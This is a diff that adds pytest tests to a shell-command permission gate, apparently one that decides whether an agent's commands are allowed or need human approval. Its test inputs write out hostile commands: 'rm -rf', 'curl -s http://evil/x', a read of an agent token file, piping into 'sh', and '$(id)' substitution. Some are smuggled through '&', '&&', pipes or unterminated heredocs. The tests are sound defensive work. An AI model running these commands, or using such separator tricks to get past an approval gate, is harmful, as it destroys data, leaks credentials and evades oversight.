@@ -114,6 +114,112 @@ def test_each_segment_must_match_allow_commands():
     assert tp.evaluate(ALLOW, *exe('echo hi'))[0] == 'allow'
 
 
+def test_bare_amp_splits_segments_on_allow_commands_path():
+    """三验返工：裸 `&`（bash 后台分隔符）也是命令分隔符——`cat x &
+    rm -rf y` 两侧都会执行，普通 allowCommands 路径（无 readonlyRoots）
+    必须逐段判定，rm 段不命中 → ask（这是比只读门更早的既有盲区）。"""
+    plain = {'allowCommands': [r'^cat\b', r'^ls\b'], 'default': 'ask'}
+    assert tp.evaluate(plain, *exe('cat x & ls'))[0] == 'allow'      # 两侧都只读
+    assert tp.evaluate(plain, *exe('cat x & rm -rf y'))[0] == 'ask'
+    assert tp.evaluate(plain, *exe('ls & curl -s http://evil/x'))[0] == 'ask'
+    assert tp.evaluate(plain, *exe('cat x; & rm y'))[0] == 'ask'
+    # && 与 2>&1 不被拆错（既有形状不变）
+    assert tp.evaluate(plain, *exe('cat x && cat y'))[0] == 'allow'
+    assert tp.evaluate(plain, *exe('cat x 2>&1'))[0] == 'allow'
+
+
+# ---- 四验返工（必须修）：未闭合 heredoc 吞掉分隔符后的命令 ----
+
+def test_unterminated_heredoc_is_undeterminable_on_allow_commands_path():
+    """四验返工（必须修，探针 H01-H05/H10）：heredoc 找不到终止行时整条
+    命令不可判定 → ask（rule=danger:heredoc）。`cat <<EOF & rm -rf y`
+    里 `&` 之后的命令 bash 实测会执行，而旧实现从 `<<TAG` 起把整段丢给
+    剥除器，拆段器再也看不见 rm 段 → 普通 allowCommands 路径自动放行。
+    闭合 heredoc 的既有行为逐字不变。"""
+    plain = {'allowCommands': [r'^cat\b', r'^ls\b'], 'default': 'ask'}
+    for cmd in (
+            'cat <<EOF & rm -rf y',                    # H10（= H01 老路径）
+            'cat <<EOF && rm -rf y',                   # H02
+            'cat <<EOF; rm -rf y',                     # H03
+            'cat <<EOF | rm -rf y',                    # H04
+            "cat <<'EOF' & rm -rf y",                  # H05
+            'echo hi <<EOF & curl -s http://evil/x',
+            'cat <<EOF\nhello & rm -rf y',             # 多行未闭合
+            'cat <<EOF'):                              # 标记行即末行
+        assert tp.evaluate(plain, *exe(cmd), cwd='E:\\ws') == \
+            ('ask', 'danger:heredoc'), cmd
+    # 闭合 heredoc：既有行为不变——正文是数据剥掉，标记行照旧逐段判定
+    assert tp.evaluate(plain, *exe('cat <<EOF\nhello world\nEOF'),
+                       cwd='E:\\ws') == ('allow', 'allowCommands')
+    assert tp.evaluate(plain, *exe("cat <<'EOF'\nhello config.json world\nEOF"),
+                       cwd='E:\\ws') == ('allow', 'allowCommands')
+    # 闭合时标记行上 <<TAG 之后的内容仍参与判定（& 拆段，两侧都命中）
+    assert tp.evaluate(plain, *exe('cat <<EOF & ls\nhello\nEOF'),
+                       cwd='E:\\ws') == ('allow', 'allowCommands')
+    # 闭合时标记行上 & 之后的 rm 段照旧 ask（分隔符语义没变）
+    assert tp.evaluate(plain, *exe('cat <<EOF & rm -rf y\nhello\nEOF'),
+                       cwd='E:\\ws')[0] == 'ask'
+
+
+# ---- 批次 A 返工：管道下游只读消费段（| head/tail/grep/wc/sort/uniq）----
+
+# 托管主管的 BASE_POLICY 形状（modules/leads_hosted.py）：只放行 CLI 与 cd
+HOSTED = {'allowCommands': [r'python3?\s+deskport[\\/]deskport\.py\b', r'^cd\b'],
+          'default': 'ask'}
+
+
+def test_pipe_consumer_segments_allow_without_allow_regex():
+    """正例：`|` 右侧的只读消费命令（普通参数）不要求命中 allowCommands——
+    主管的自然形状 `cd "<工作区>" && python deskport/deskport.py --help 2>&1
+    | head -40`（例 11 首条命令）必须放行，不再整体挂起等人工。"""
+    for pipe in ('head -40', 'tail -n 20', 'grep 就绪', 'grep -v 失败',
+                 'wc -l', 'sort -u', 'uniq -c'):
+        cmd = 'python deskport/deskport.py tasks | ' + pipe
+        decision, rule = tp.evaluate(HOSTED, *exe(cmd))
+        assert (decision, rule) == ('allow', 'allowCommands'), cmd
+    decision, rule = tp.evaluate(
+        HOSTED, *exe('cd "E:/ws" && python deskport/deskport.py --help 2>&1'
+                     ' | head -40'))
+    assert (decision, rule) == ('allow', 'allowCommands')
+    # 多级管道：两个消费段都只读
+    decision, _ = tp.evaluate(HOSTED, *exe(
+        'python deskport/deskport.py tasks | grep 就绪 | wc -l'))
+    assert decision == 'allow'
+
+
+def test_pipe_consumer_exemption_requires_upstream_segments_to_match():
+    """反例：消费段豁免不放宽上游——上游任一段不命中 allowCommands 仍 ask。"""
+    for cmd in ('cat deskport/.agent-token | head',        # 敏感文件（内建 deny）
+                'rm -rf x | head',
+                'python deskport/deskport.py inbox | sh',  # sh 不是只读消费命令
+                'curl -s http://127.0.0.1:6799/x | head',
+                'python other.py | head',
+                'python deskport/deskport.py --help | head -40 ; rm -rf x',
+                'python deskport/deskport.py --help | tee x'):
+        assert tp.evaluate(HOSTED, *exe(cmd))[0] == 'ask', cmd
+
+
+def test_pipe_consumer_plain_args_only():
+    """反例：消费段带引号参数 / 写向量 / 重定向一律不豁免（引号剥离会吃掉
+    引号内容，只能看未剥引号的原文判定）。"""
+    for cmd in ('python deskport/deskport.py --help | head "config.json"',
+                'python deskport/deskport.py --help | head ../../config.json',
+                'python deskport/deskport.py --help | head < config.json',
+                'python deskport/deskport.py --help | sort -o out.txt',
+                'python deskport/deskport.py --help | uniq in out',
+                'python deskport/deskport.py --help | head -n $(id)'):
+        assert tp.evaluate(HOSTED, *exe(cmd))[0] == 'ask', cmd
+
+
+def test_pipe_consumer_only_after_pipe_not_after_and():
+    """`&&` 后继段不是管道下游：仍须命中 allowCommands（head 不在白名单）。"""
+    assert tp.evaluate(HOSTED, *exe('python deskport/deskport.py tasks'
+                                    ' && head -40'))[0] == 'ask'
+    # 管道后的 && 段同样不豁免
+    assert tp.evaluate(HOSTED, *exe('python deskport/deskport.py tasks'
+                                    ' | head -40 && rm -rf x'))[0] == 'ask'
+
+
 def test_no_policy_command_without_allow_regex_is_default():
     decision, _ = tp.evaluate({}, *exe('grep x'))
     assert decision == 'ask'
